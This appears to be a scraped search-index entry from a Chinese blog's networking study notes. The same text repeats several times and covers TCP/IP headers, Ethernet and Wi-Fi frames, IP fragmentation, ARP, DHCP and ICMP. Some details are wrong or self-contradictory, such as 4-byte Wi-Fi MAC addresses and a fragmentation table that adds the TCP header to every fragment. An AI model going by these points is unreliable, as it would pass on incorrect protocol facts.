TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#数据包详解"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#数据包示意图"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#数据链路层"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#帧-frame"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 